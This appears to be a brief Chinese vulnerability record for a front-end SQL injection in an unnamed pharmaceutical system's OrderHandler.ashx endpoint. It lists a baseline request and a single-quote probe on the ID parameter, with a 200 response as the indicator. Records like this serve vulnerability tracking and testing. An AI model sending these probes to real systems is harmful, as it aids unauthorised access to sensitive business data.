# 某医药系统OrderHandler存在前台SQL注入漏洞

某医药系统 ｜ SQL注入 ｜ —

**Payload**
```
/admin/caiwuchongxiao/OrderHandler.ashx?ID=1&ordertype=1
/admin/caiwuchongxiao/OrderHandler.ashx?ID=1%27&ordertype=1
:---
```
- **响应特征**：200